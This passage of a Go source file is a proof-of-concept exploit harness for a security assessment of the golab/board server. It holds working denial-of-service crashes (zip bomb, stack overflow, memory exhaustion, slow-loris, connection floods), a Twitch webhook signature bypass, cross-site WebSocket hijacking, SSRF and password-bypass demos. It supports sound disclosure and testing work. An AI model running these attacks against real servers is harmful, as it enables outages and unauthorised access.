// Command harness is a proof-of-concept exploit harness for the Critical, High,
// and Medium findings in ../../../SECURITY_ASSESSMENT.md (run as
// `go run ./security/poc/harness <id>`).
//
// It is intended to be run ONLY against a local, disposable test instance of
// golab/board that you own and are authorised to test. Several PoCs crash or
// exhaust the target (that is the finding). Do not point it at production or at
// any system you do not control.
//
// Build/run:
//
//	go run ./security/poc/harness <finding-id> [flags]
//
// Run with no arguments for the full list of finding IDs. Data-race findings
// (DR-2/DR-3) are reproduced separately with `go test -race ./security/poc/race/`.
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	stdzip "archive/zip"

	"github.com/golab/board/internal/fetch"
	izip "github.com/golab/board/internal/zip"
	"github.com/golab/board/pkg/config"
	"github.com/golab/board/pkg/core"
	"github.com/golab/board/pkg/core/board"
	"github.com/golab/board/pkg/core/color"
	"github.com/golab/board/pkg/core/coord"
	"github.com/golab/board/pkg/core/parser"
	evpkg "github.com/golab/board/pkg/event"
	"github.com/golab/board/pkg/hub"
	"github.com/golab/board/pkg/logx"
	"github.com/golab/board/pkg/room"
	"github.com/golab/board/pkg/room/plugin"
	"github.com/golab/board/pkg/state"
	"golang.org/x/net/websocket"
)

// ---- shared config ------------------------------------------------------

var (
	target string // host:port of the target, e.g. localhost:8080
	origin string // Origin header to present (used by h1)
)

func parseCommon(args []string) []string {
	rest := []string{}
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-target", "-origin":
			if i+1 >= len(args) {
				fmt.Printf("missing value for %s\n", args[i])
				os.Exit(2)
			}
			i++
			if args[i-1] == "-target" {
				target = args[i]
			} else {
				origin = args[i]
			}
		default:
			rest = append(rest, args[i])
		}
	}
	return rest
}

func requireTarget() {
	if target == "" {
		fmt.Println("this PoC needs a live target. pass -target host:port (e.g. -target localhost:8080)")
		fmt.Println("run it ONLY against a local disposable instance you own.")
		os.Exit(2)
	}
}

func banner(id, title string) {
	fmt.Printf("\n=== PoC %s — %s ===\n", strings.ToUpper(id), title)
}

// ---- websocket client (mirrors the repo's own wire framing) -------------

// The server frames application messages as: 4-byte little-endian length
// prefix, followed by that many bytes of JSON (see pkg/event/channel.go).
type wsClient struct{ ws *websocket.Conn }

func dial(room string) (*wsClient, error) {
	requireTarget()
	u := url.URL{Scheme: "ws", Host: target, Path: "/socket/b/" + room}
	org := origin
	if org == "" {
		org = "http://" + target
	}
	cfg, err := websocket.NewConfig(u.String(), org)
	if err != nil {
		return nil, err
	}
	cfg.Header.Set("User-Agent", "golab-poc")
	ws, err := websocket.DialConfig(cfg)
	if err != nil {
		return nil, err
	}
	return &wsClient{ws}, nil
}

// sendFramed writes a well-formed [len][payload] application message.
func (c *wsClient) sendFramed(payload string) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(len(payload)))
	if _, err := c.ws.Write(buf); err != nil {
		return err
	}
	_, err := c.ws.Write([]byte(payload))
	return err
}

// sendRaw writes arbitrary bytes straight onto the socket (for malformed framing).
func (c *wsClient) sendRaw(b []byte) error {
	_, err := c.ws.Write(b)
	return err
}

func (c *wsClient) drainOne() {
	_ = c.ws.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 4096)
	_, _ = c.ws.Read(buf)
	_ = c.ws.SetReadDeadline(time.Time{})
}

func (c *wsClient) close() { _ = c.ws.Close() }

// serverAlive is a crude liveness probe against the public /api/ping endpoint.
func serverAlive() bool {
	requireTarget()
	cl := &http.Client{Timeout: 3 * time.Second}
	resp, err := cl.Get("http://" + target + "/api/ping")
	if err != nil {
		return false
	}
	_ = resp.Body.Close()
	return resp.StatusCode == 200
}

func reportCrash(before bool) {
	time.Sleep(1 * time.Second)
	after := serverAlive()
	fmt.Printf("server /api/ping before: %v, after: %v\n", before, after)
	if before && !after {
		fmt.Println(">> TARGET IS DOWN — vulnerability confirmed (whole process crashed).")
	} else if before && after {
		fmt.Println(">> target still responding; check server logs for a panic/stack trace,")
		fmt.Println("   or increase the payload. (An unrecovered panic there == full crash.)")
	}
}

// helpers for building event JSON
func event(typ, valueJSON string) string {
	return fmt.Sprintf(`{"event":%q,"value":%s}`, typ, valueJSON)
}

// =========================================================================
// CRITICAL
// =========================================================================

// C-1: unchecked type assertion in handleUpdateSettings -> panic.
// VALIDATED: net/http's per-request recover() catches this synchronous panic, so
// it drops ONLY this connection and logs "http: panic serving ..." — it does NOT
// crash the whole server. Still a per-connection DoS + log-spam + latent crash
// (the same unchecked assertions are fatal in spawned goroutines: see the OGS
// plugin / heartbeat). The real whole-server crashes are C-6, H-7 (stack
// overflow) and C-3, C-5 (OOM), which bypass recover().
func pocC1() {
	banner("c1", "update_settings type-assertion panic (RECOVERED by net/http — per-connection DoS)")
	before := serverAlive()
	c, err := dial("poc-c1")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	c.drainOne()
	// value is a STRING, but handleUpdateSettings does evt.Value().(map[string]any)
	// -> panic: interface conversion. (An empty object {} also panics on the
	// subsequent sMap["buffer"].(float64).)
	payload := event("update_settings", `"not-a-map"`)
	fmt.Println("sending:", payload)
	if err := c.sendFramed(payload); err != nil {
		fmt.Println("send error:", err)
	}
	reportCrash(before)
}

// C-2: malformed GIB coordinate -> alphabet[x] index panic. Calls the real
// parser directly (this is exactly what an upload_sgf of this GIB reaches).
func pocC2() {
	banner("c2", "Index-out-of-range panic on malformed GIB (STO coordinate)")
	gib := "\\HS\n\\HE\n\\GS\nSTO 0 0 1 25 0\n\\GE"
	fmt.Printf("feeding malicious GIB to parser.New(...).Parse():\n%q\n", gib)
	if target != "" {
		fmt.Println("(also uploadable end-to-end via upload_sgf: base64 =", base64.StdEncoding.EncodeToString([]byte(gib)), ")")
	}
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf(">> PANIC: %v\n", r)
				fmt.Println(">> VALIDATED: via an upload this panics inside the request goroutine, which")
				fmt.Println(">> net/http RECOVERS -> the connection dies, the server survives. Per-connection")
				fmt.Println(">> DoS + log spam. It WOULD crash the server if reached from a spawned goroutine")
				fmt.Println(">> (e.g. the OGS plugin loop). Fix the bounds check regardless.")
			}
		}()
		_, _ = parser.New(gib).Parse()
		fmt.Println("no panic (unexpected)")
	}()
}

// C-3: unbounded board size in update_settings -> NewBoard O(size^2) OOM.
func pocC3() {
	banner("c3", "Board-size memory exhaustion via update_settings")
	before := serverAlive()
	c, err := dial("poc-c3")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	c.drainOne()
	// A well-formed settings object with an enormous size. NewBoard allocates
	// size x size color cells. 200000^2 = 4e10 cells -> OOM.
	val := `{"buffer":250,"size":200000,"nickname":"x","black":"","white":"","komi":"","password":""}`
	payload := event("update_settings", val)
	fmt.Println("sending update_settings with size=200000 (allocates ~size^2 cells)")
	if err := c.sendFramed(payload); err != nil {
		fmt.Println("send error:", err)
	}
	reportCrash(before)
}

// C-4: no maximum message size. VALIDATED: readBytes does NOT pre-allocate the
// declared length; it grows the buffer incrementally as bytes actually arrive.
// So a 4-byte "0xFFFFFFFF" frame does not instantly allocate 4 GB. The real bug
// is that there is NO upper bound on message size and NO read deadline: a client
// can make the server buffer as much as it is willing to send (per connection),
// and can stall mid-message to pin a goroutine forever (the H-4 slow-loris).
func pocC4() {
	banner("c4", "No max WebSocket message size + no read deadline (unbounded buffering / slow-loris)")
	before := serverAlive()
	c, err := dial("poc-c4")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	c.drainOne()
	// Declare a ~4 GB payload, then send only a few bytes. readPacket trusts the
	// length and readBytes loops allocating toward it (no max-size check).
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, 0xFFFFFFFF)
	fmt.Println("declaring a 4 GiB message, then feeding bytes the server dutifully buffers (no cap)...")
	if err := c.sendRaw(hdr); err != nil {
		fmt.Println("send error:", err)
	}
	// Each chunk is retained server-side in `message` with no ceiling. Send more
	// (or open many connections) to grow memory without bound. Stop sending and
	// the server's readBytes blocks forever with no deadline (slow-loris, H-4).
	for i := 0; i < 64; i++ {
		_ = c.sendRaw(bytes.Repeat([]byte("A"), 1024))
		time.Sleep(20 * time.Millisecond)
	}
	fmt.Println("the server has buffered everything sent so far and is now blocked waiting for the")
	fmt.Println("rest of the 4 GiB — goroutine + buffer pinned with no timeout. Scale up to exhaust RAM.")
	reportCrash(before)
}

// C-5: zip bomb -> unbounded in-memory decompression. Calls the real
// internal/zip.Decompress on a tiny archive that inflates massively.
func pocC5() {
	banner("c5", "ZIP bomb — unbounded in-memory decompression")
	mb := 512 // uncompressed size of the single entry, in MiB
	var raw bytes.Buffer
	zw := stdzip.NewWriter(&raw)
	w, _ := zw.Create("bomb.sgf")
	zeros := make([]byte, 1<<20) // 1 MiB of zeros compresses to almost nothing
	for i := 0; i < mb; i++ {
		_, _ = w.Write(zeros)
	}
	_ = zw.Close()
	comp := raw.Bytes()
	fmt.Printf("crafted zip: compressed=%d bytes, declares %d MiB uncompressed (ratio ~%dx)\n",
		len(comp), mb, (mb<<20)/len(comp))
	fmt.Println("calling internal/zip.Decompress (no per-entry / total / count caps)...")
	files, err := izip.Decompress(comp)
	if err != nil {
		fmt.Println("decompress error:", err)
		return
	}
	total := 0
	for _, f := range files {
		total += len(f)
	}
	fmt.Printf(">> Decompress returned %d bytes into memory from a %d-byte upload.\n", total, len(comp))
	fmt.Println(">> Scale mb up (or add entries) to OOM the process. Real upload path: upload_sgf with a zip.")
}

// C-6: deeply nested SGF -> unbounded recursion -> stack overflow (fatal).
// VALIDATED end-to-end: this is a genuine unauthenticated WHOLE-SERVER crash.
// A stack overflow is a fatal runtime error that net/http's recover() cannot
// catch. Delivery: the upload_sgf STRING branch caps decoded input at 1 MiB
// (limiting depth below the overflow threshold), BUT the ARRAY branch
//
//	{"event":"upload_sgf","value":["<base64 of 12,000,000 '(' >"]}
//
// has NO size cap and reaches the same parser -> confirmed crash of the whole
// process via POST /api/v1/room/{board} (see security/poc/README.md for the
// exact request). This local call demonstrates the same fatal recursion.
func pocC6() {
	banner("c6", "Stack overflow via deeply nested SGF (CONFIRMED whole-server crash; array upload bypasses 1MB cap)")
	depth := 12000000
	sgf := strings.Repeat("(", depth)
	fmt.Printf("feeding %d nested '(' to parser.New(...).Parse()\n", depth)
	fmt.Println(">> WARNING: a Go stack overflow is a FATAL error that recover() CANNOT catch.")
	fmt.Println(">> This harness process will crash now — same fatal error the server suffers via the")
	fmt.Println(">> uncapped upload_sgf array branch (value as a JSON list).")
	_, _ = parser.New(sgf).Parse()
	fmt.Println("no crash (unexpected — try a larger depth)")
}

// C-7: unauthenticated HTTP API drives any room's state (and triggers the crashes).
func pocC7() {
	banner("c7", "Unauthenticated state manipulation + crash via POST /api/v1/room/{board}")
	requireTarget()
	before := serverAlive()
	// Same type-confusion payload as C-1, but over plain HTTP with no auth.
	body := event("update_settings", `"not-a-map"`)
	u := "http://" + target + "/api/v1/room/poc-c7"
	fmt.Println("POST", u)
	fmt.Println("body:", body)
	resp, err := http.Post(u, "application/json", strings.NewReader(body))
	if err != nil {
		fmt.Println("request error (server may have just died):", err)
	} else {
		b, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		fmt.Printf("response: %s %s\n", resp.Status, strings.TrimSpace(string(b)))
	}
	fmt.Println("note: this endpoint needs no authentication and has no request-body size limit.")
	fmt.Println("VALIDATED: the type-assertion panic itself is recovered by net/http (server survives),")
	fmt.Println("but this same unauthenticated endpoint DELIVERS the real whole-server crashes — send the")
	fmt.Println("C-6 / H-7 array-upload body here (see README) and the process dies with a fatal stack overflow.")
	reportCrash(before)
}

// =========================================================================
// HIGH
// =========================================================================

// H-1: no Origin check -> cross-site WebSocket hijacking (CSWSH).
func pocH1() {
	banner("h1", "No WebSocket Origin check -> CSWSH")
	if origin == "" {
		origin = "http://evil.example"
	}
	fmt.Printf("dialing /socket with a cross-site Origin: %s\n", origin)
	c, err := dial("poc-h1")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	defer c.close()
	// If we can connect and receive the initial frame with a foreign Origin,
	// the server did not validate Origin -> any website can drive a victim's boards.
	_ = c.ws.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 4096)
	n, err := c.ws.Read(buf)
	if err == nil && n > 0 {
		fmt.Printf(">> ACCEPTED cross-origin connection and received %d bytes (initial frame).\n", n)
		fmt.Println(">> Origin is not validated -> CSWSH confirmed. See web/h1_cswsh.html for a browser PoC.")
	} else {
		fmt.Println("no data received:", err)
	}
}

// H-2: unbounded room creation.
func pocH2() {
	banner("h2", "Unbounded room creation -> resource exhaustion")
	requireTarget()
	n := 500
	fmt.Printf("creating %d distinct rooms by connecting to unique board IDs...\n", n)
	start := roomCount()
	var wg sync.WaitGroup
	sem := make(chan struct{}, 64)
	for i := 0; i < n; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func(i int) {
			defer wg.Done()
			defer func() { <-sem }()
			c, err := dial(fmt.Sprintf("poc-h2-flood-%d", i))
			if err != nil {
				return
			}
			c.drainOne()
			c.close() // even after we disconnect, the room lives ~1h (H-2/M-8)
		}(i)
	}
	wg.Wait()
	time.Sleep(500 * time.Millisecond)
	end := roomCount()
	fmt.Printf(">> /api/stats rooms: before=%d after=%d (grew by ~%d; each also spawned a goroutine).\n",
		start, end, end-start)
}

// H-3: no connection limit / rate limiting.
func pocH3() {
	banner("h3", "No connection limits / rate limiting")
	requireTarget()
	n := 1000
	fmt.Printf("opening %d concurrent connections to a single room...\n", n)
	var held []*wsClient
	var mu sync.Mutex
	var ok int64
	var wg sync.WaitGroup
	sem := make(chan struct{}, 128)
	for i := 0; i < n; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			c, err := dial("poc-h3")
			if err != nil {
				return
			}
			atomic.AddInt64(&ok, 1)
			mu.Lock()
			held = append(held, c)
			mu.Unlock()
		}()
	}
	wg.Wait()
	fmt.Printf(">> opened %d/%d connections with no throttling or cap. Connections reported by /api/stats: %d\n",
		ok, n, connCount())
	fmt.Println("holding them for 3s, then releasing.")
	time.Sleep(3 * time.Second)
	for _, c := range held {
		c.close()
	}
}

// H-4: no read timeout -> slow-loris (goroutine + memory pinned forever).
func pocH4() {
	banner("h4", "No WebSocket read timeout -> slow-loris")
	c, err := dial("poc-h4")
	if err != nil {
		fmt.Println("dial error:", err)
		return
	}
	c.drainOne()
	// Send a length prefix promising more bytes, then never send them.
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, 4096)
	_ = c.sendRaw(hdr)
	fmt.Println(">> sent a 4-byte prefix promising 4096 bytes, then nothing.")
	fmt.Println(">> The server's ReceiveEvent blocks in readBytes with no deadline, holding a")
	fmt.Println(">> goroutine + partial buffer indefinitely. Repeat cheaply to exhaust the server.")
	fmt.Println("holding the connection open for 30s (Ctrl-C to stop earlier)...")
	time.Sleep(30 * time.Second)
	c.close()
}

// H-5: Twitch webhook HMAC bypass when the signing secret is empty.
func pocH5() {
	banner("h5", "Twitch webhook HMAC bypass when secret is empty")
	requireTarget()
	// A forged EventSub notification with NO valid signature. If the server's
	// configured Twitch secret is empty, twitch.Verify() returns true (fails open)
	// and this is processed as authentic.
	body := `{"subscription":{"type":"channel.chat.message"},` +
		`"event":{"broadcaster_user_id":"1","chatter_user_id":"1",` +
		`"message":{"text":"!setboard attacker-controlled-room"}}}`
	req, _ := http.NewRequest("POST", "http://"+target+"/apps/twitch/callback", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Twitch-Eventsub-Message-Type", "notification")
	req.Header.Set("Twitch-Eventsub-Message-Id", "poc-1")
	req.Header.Set("Twitch-Eventsub-Message-Timestamp", time.Now().UTC().Format(time.RFC3339))
	req.Header.Set("Twitch-Eventsub-Message-Signature", "sha256=deadbeef") // deliberately WRONG
	fmt.Println("POST /apps/twitch/callback with an INVALID signature and forged body.")
	resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
	if err != nil {
		fmt.Println("request error:", err)
		return
	}
	b, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	fmt.Printf("response: %s %s\n", resp.Status, strings.TrimSpace(string(b)))
	fmt.Println(">> If the secret is unset, the bad signature is accepted (Verify returns true on empty secret).")
	fmt.Println(">> A 2xx / processed response here == authentication bypass.")
}

// H-6: CORRECTED during PoC validation — the NGF/SGF board-size path is NOT
// exploitable. state.FromSGF clamps size > 19 before any board allocation, so a
// huge SZ never reaches board.NewBoard via an upload. This PoC verifies the
// mitigation. The genuinely unbounded board-size DoS is C-3 (update_settings).
func pocH6() {
	banner("h6", "Board size from NGF/SGF — MITIGATED by the FromSGF size>19 clamp (see C-3 for the real bug)")
	_, err := state.FromSGF("(;SZ[50000])")
	fmt.Printf("state.FromSGF(\"(;SZ[50000])\") -> %v\n", err)
	if err != nil {
		fmt.Println(">> The clamp rejects oversized boards; the NGF parser only stores size as a")
		fmt.Println(">> string field and never allocates on it. H-6 is NOT exploitable via upload.")
		fmt.Println(">> The real, unclamped board-size DoS is C-3 (update_settings -> state.NewState).")
	} else {
		fmt.Println(">> UNEXPECTED: clamp did not fire — re-open H-6 as a live finding.")
	}
}

// H-7: deep linear tree -> recursive toSGF -> stack overflow (fatal).
// VALIDATED end-to-end: an unauthenticated whole-server crash. Delivery is the
// uncapped upload_sgf ARRAY branch with TWO entries (>=2 SGFs makes Merge call
// the recursive serializer toSGF):
//
//	{"event":"upload_sgf","value":["<b64 of ( ;x12,000,000 )>","<same>"]}
//
// POSTed to /api/v1/room/{board} crashes the process (trace shows (*SGFNode).toSGF).
func pocH7() {
	banner("h7", "Stack overflow in tree toSGF recursion (CONFIRMED whole-server crash via array upload of 2 SGFs)")
	depth := 12000000
	// One branch, many linear ';' nodes: parses iteratively but builds a deep
	// tree. parser.Merge serialises via the recursive toSGF -> stack overflow.
	sgf := "(" + strings.Repeat(";", depth) + ")"
	fmt.Printf("building a linear SGF of depth %d and calling parser.Merge (reached by multi-file upload)\n", depth)
	fmt.Println(">> WARNING: recursive toSGF overflows the stack; this FATAL error crashes the process.")
	_ = parser.Merge([]string{sgf, sgf})
	fmt.Println("no crash (unexpected — try a larger depth)")
}

// =========================================================================
// MEDIUM (verification PoCs)
// =========================================================================

// M-2: unbounded HTTP request body (io.ReadAll(r.Body), no MaxBytesReader).
func pocM2() {
	banner("m2", "Unbounded HTTP request body (io.ReadAll, no cap)")
	requireTarget()
	before := serverAlive()
	const n = 40 << 20 // 40 MiB body
	fmt.Printf("POST /api/v1/room/poc-m2 with a %d MiB body (server io.ReadAll's it entirely)\n", n>>20)
	// stream a big body; the JSON is invalid but the server buffers it all first
	body := io.MultiReader(strings.NewReader(`{"event":"ping","value":"`),
		io.LimitReader(zeroReader{}, n), strings.NewReader(`"}`))
	req, _ := http.NewRequest("POST", "http://"+target+"/api/v1/room/poc-m2", body)
	req.Header.Set("Content-Type", "application/json")
	resp, err := (&http.Client{Timeout: 30 * time.Second}).Do(req)
	if err != nil {
		fmt.Println("request error:", err)
	} else {
		_ = resp.Body.Close()
		fmt.Printf("server accepted and buffered the whole body (status %s)\n", resp.Status)
	}
	fmt.Println(">> no per-request size limit; scale up / parallelize to pressure memory.")
	fmt.Println(">> Behind a reverse proxy this HTTP vector is capped by client_max_body_size; the WS")
	fmt.Println(">> framing path (C-4) is the uncapped equivalent that a proxy tunnels.")
	reportCrash(before)
}

type zeroReader struct{}

func (zeroReader) Read(p []byte) (int, error) {
	for i := range p {
		p[i] = 'A'
	}
	return len(p), nil
}

// M-3: /debug leaks full room state with no auth (even password-protected rooms).
func pocM3() {
	banner("m3", "/debug leaks full room state unauthenticated")
	requireTarget()
	// create/seed a room, then read its debug dump with no credentials
	_, _ = http.Post("http://"+target+"/api/v1/room/poc-m3", "application/json",
		strings.NewReader(event("ping", `""`)))
	resp, err := http.Get("http://" + target + "/b/poc-m3/debug")
	if err != nil {
		fmt.Println("request error:", err)
		return
	}
	b, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	fmt.Printf("GET /b/poc-m3/debug -> %s\n%s\n", resp.Status, strings.TrimSpace(string(b)))
	fmt.Println(">> full StateJSON (SGF, location, prefs) of ANY room, no password required.")
	fmt.Println(">> Behind a proxy this is still reachable (normal GET); works on password rooms too.")
}

// M-4: SSRF — the fetch client follows redirects to arbitrary hosts, no timeout.
// Self-contained: an "approved-looking" server 302-redirects to an "internal"
// server; DefaultFetcher.Fetch follows it and returns the internal content.
func pocM4() {
	banner("m4", "SSRF: fetch follows cross-host redirects with no timeout")
	// "internal" service (stands in for a cluster-internal svc or 169.254.169.254)
	internalMux := http.NewServeMux()
	internalMux.HandleFunc("/secret", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("INTERNAL-ONLY-SECRET (e.g. k8s service / cloud metadata)"))
	})
	internal := &http.Server{Handler: internalMux}
	il, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		fmt.Println("listen error (internal):", err)
		return
	}
	go internal.Serve(il)  //nolint:errcheck
	defer internal.Close() //nolint:errcheck
	internalURL := "http://" + il.Addr().String() + "/secret"

	// "approved" edge that open-redirects to the internal target
	edgeMux := http.NewServeMux()
	edgeMux.HandleFunc("/redirect", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, internalURL, http.StatusFound)
	})
	edge := &http.Server{Handler: edgeMux}
	el, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		fmt.Println("listen error (edge):", err)
		return
	}
	go edge.Serve(el)  //nolint:errcheck
	defer edge.Close() //nolint:errcheck
	edgeURL := "http://" + el.Addr().String() + "/redirect"

	fmt.Printf("fetching %s (which 302-redirects to the internal %s)\n", edgeURL, internalURL)
	got, err := fetch.NewDefaultFetcher(nil).Fetch(edgeURL)
	if err != nil {
		fmt.Println("fetch error:", err)
		return
	}
	fmt.Printf(">> Fetch followed the redirect and returned: %q\n", got)
	fmt.Println(">> internal/fetch uses http.DefaultClient: follows redirects, re-validates NO host, NO timeout.")
	fmt.Println(">> Reachability: ApprovedFetch checks only the FIRST hop's hostname; an open-redirect on any")
	fmt.Println(">> approved host (or the OGSCheckEnded/FetchOGS direct-Fetch paths) pivots server-side requests.")
	fmt.Println(">> In Kubernetes the impact is high: cluster-internal services and cloud metadata become reachable.")
}

// M-5: Twitch challenge echoed BEFORE signature verification.
func pocM5() {
	banner("m5", "Twitch challenge echoed before signature verification")
	requireTarget()
	body := `{"challenge":"UNAUTH-ECHO-` + "reflected-value" + `"}`
	req, _ := http.NewRequest("POST", "http://"+target+"/apps/twitch/callback", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	// deliberately NO valid signature
	resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
	if err != nil {
		fmt.Println("request error:", err)
		return
	}
	b, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()
	fmt.Printf("POST /apps/twitch/callback {\"challenge\":...} (no signature) -> %s, body=%q\n",
		resp.Status, strings.TrimSpace(string(b)))
	fmt.Println(">> the challenge is reflected with no HMAC check -> any party can auto-confirm subscriptions.")
}

// M-7: coord/board out-of-range panic reachable in the REQUEST path (recovered).
// Same defect family as P2-A1 but shown via coord.FromInterface, which panics on
// a non-numeric array element (command_decoder uses it on client JSON).
func pocM7() {
	banner("m7", "coord/board out-of-range panics (request path = recovered; same defect as A1)")
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf(">> coord.FromInterface PANIC: %v\n", r)
				fmt.Println(">> reached from command_decoder on a crafted board command (e.g. goto_coord/label).")
				fmt.Println(">> In the request goroutine this is RECOVERED (per-connection). Guard it anyway:")
				fmt.Println(">> the identical unguarded coord/Board.Set code is FATAL via the OGS goroutine (A1).")
			}
		}()
		// a coords array whose element is a string, not a number
		_, _ = coord.FromInterface([]any{"x", "y"})
		fmt.Println("no panic (unexpected)")
	}()
}

// =========================================================================
// EXTENDED REVIEW — concurrency / crypto (see SECURITY_ASSESSMENT.md §11)
// =========================================================================

// DR-1: concurrent map iteration+write on r.nicks -> fatal runtime throw.
// handleUpdateNickname returns event.NewEvent("connected_users", r.Nicks()) where
// Nicks() returns the LIVE map; the /api/v1 handler json.Marshal()s it OUTSIDE the
// lock while a concurrent request's SetNick writes r.nicks. A concurrent-map access
// is a FATAL runtime error, NOT a panic, so net/http's recover cannot contain it.
func pocDR1() {
	banner("dr1", "Concurrent map read/write on r.nicks via /api/v1 -> fatal whole-server crash")
	requireTarget()
	before := serverAlive()
	fmt.Println("firing concurrent POST /api/v1/room/dr1 update_nickname (distinct userids)...")
	var wg sync.WaitGroup
	sem := make(chan struct{}, 64)
	for i := 0; i < 4000; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func(n int) {
			defer wg.Done()
			defer func() { <-sem }()
			body := fmt.Sprintf(`{"event":"update_nickname","value":"n%d","userid":"u%d"}`, n, n)
			req, _ := http.NewRequest("POST", "http://"+target+"/api/v1/room/dr1", strings.NewReader(body))
			resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
			if err == nil {
				_ = resp.Body.Close()
			}
		}(i)
	}
	wg.Wait()
	fmt.Println("flood done — expect: fatal error: concurrent map iteration and map write")
	reportCrash(before)
}

// DL-2: Broadcast holds r.mu across the blocking SendEvent (ws write, no deadline),
// so one stuck-reading client freezes the ENTIRE room. Local demo with a writer
// whose SendEvent blocks after the initial frame.
type blockingWriter struct {
	evpkg.EventChannel
	calls int32
	block chan struct{}
}

func (b *blockingWriter) SendEvent(evpkg.Event) error {
	if atomic.AddInt32(&b.calls, 1) == 1 {
		return nil // let RegisterConnection's initial frame through
	}
	<-b.block
	return nil
}

func pocDL2() {
	banner("dl2", "Slow-reader freezes the whole room (r.mu held during blocking ws write)")
	r := room.NewRoom("freeze")
	stuck := &blockingWriter{EventChannel: evpkg.NewMockEventChannel(), block: make(chan struct{})}
	defer close(stuck.block)
	r.RegisterConnection(stuck)

	go r.Broadcast(evpkg.NewEvent("global", "x")) // takes r.mu, then blocks on the 2nd SendEvent
	time.Sleep(150 * time.Millisecond)

	done := make(chan struct{})
	go func() { _ = r.Size(); close(done) }() // r.Size() needs r.mu
	select {
	case <-done:
		fmt.Println("r.Size() completed — room NOT frozen (unexpected)")
	case <-time.After(1 * time.Second):
		fmt.Println(">> CONFIRMED: r.Size() blocked ~1s — one stuck reader holds r.mu via Broadcast and")
		fmt.Println(">> freezes the entire room (all joins/moves/frames). No write deadline anywhere.")
		fmt.Println(">> Escalates: Hub.SendMessages holds h.mu while broadcasting to every room.")
	}
}

// CS-2: a password > 72 bytes makes bcrypt error; core.Hash discards the error and
// returns "", so the room is stored with an EMPTY password -> silently open.
func pocCS2() {
	banner("cs2", "Password > 72 bytes silently disables room protection (discarded bcrypt error)")
	for _, n := range []int{72, 73, 100} {
		pw := strings.Repeat("A", n)
		h := core.Hash(pw)
		open := h == "" // authorized middleware treats empty password as no password
		fmt.Printf("password len=%3d -> stored hash %s -> room OPEN to everyone: %v\n",
			n, map[bool]string{true: "\"\" (EMPTY!)", false: "<bcrypt>"}[open], open)
	}
	fmt.Println(">> a 73+ byte password stores an empty hash -> HasPassword()=false -> anyone can enter,")
	fmt.Println(">> while the owner believes the room is protected. bcrypt rejects >72 bytes; Hash ignores it.")
}

// nodeCount reports the number of tree nodes in a room's state.
func nodeCount(r *room.Room) int { return len(r.GetState().Nodes()) }

func settingsVal(buffer int, password string) map[string]any {
	return map[string]any{
		"buffer": float64(buffer), "size": float64(19), "nickname": "x",
		"black": "", "white": "", "komi": "", "password": password,
	}
}

// H-6: the graft handler has neither `authorized` nor `outsideBuffer` middleware,
// so it mutates a PASSWORD-PROTECTED room from an unauthenticated actor, while a
// properly-gated handler (update_settings) is correctly blocked.
func pocH6graft() {
	banner("h6", "graft bypasses the authorized middleware (mutates a password room, unauthenticated)")
	r := room.NewRoom("h6")
	r.SetPassword(core.Hash("the-secret")) // room is now protected
	attacker := "attacker-never-authed"

	// Control: update_settings IS gated by `authorized` -> blocked for the attacker.
	buf0 := r.GetInputBuffer()
	us := evpkg.NewEvent("update_settings", settingsVal(9999, "the-secret"))
	us.SetUser(attacker)
	r.HandleAny(us)
	fmt.Printf("update_settings (authorized-gated): buffer %d -> %d  => %s\n",
		buf0, r.GetInputBuffer(), map[bool]string{true: "BLOCKED (auth works)", false: "changed"}[r.GetInputBuffer() == buf0])

	// graft has no auth middleware -> executes and mutates the tree.
	n0 := nodeCount(r)
	g := evpkg.NewEvent("graft", "d4")
	g.SetUser(attacker)
	r.HandleAny(g)
	fmt.Printf("graft (NO auth middleware): nodes %d -> %d  => %s\n",
		n0, nodeCount(r), map[bool]string{true: ">> BYPASS: graft mutated a password room with no auth", false: "no change"}[nodeCount(r) > n0])
}

// H-7: unbounded per-room tree growth; each graft also re-serializes the WHOLE
// tree (O(n)) for broadcast -> O(k^2) work + unbounded memory.
func pocH7grow() {
	banner("h7", "Unbounded tree growth + quadratic full-frame rebroadcast")
	r := room.NewRoom("h7")
	const k = 4000
	for i := 0; i < k; i++ {
		// Diverging 2-move grafts: a varying first move (parent) + a per-iteration
		// second move keeps adding fresh nodes. smartGraft only dedups exact
		// (coord,color) children, so there is no ceiling.
		g := evpkg.NewEvent("graft", coordIdx(i/19)+" "+coordIdx(i))
		g.SetUser("x")
		r.HandleAny(g)
	}
	nodes := nodeCount(r)
	sgfLen := len(r.GetState().ToSGF()) // grows with the tree; persisted on every Save
	_ = r.GenerateFullFrame(state.Full) // walks all N nodes (two O(n) Fmaps) — re-run on EVERY graft
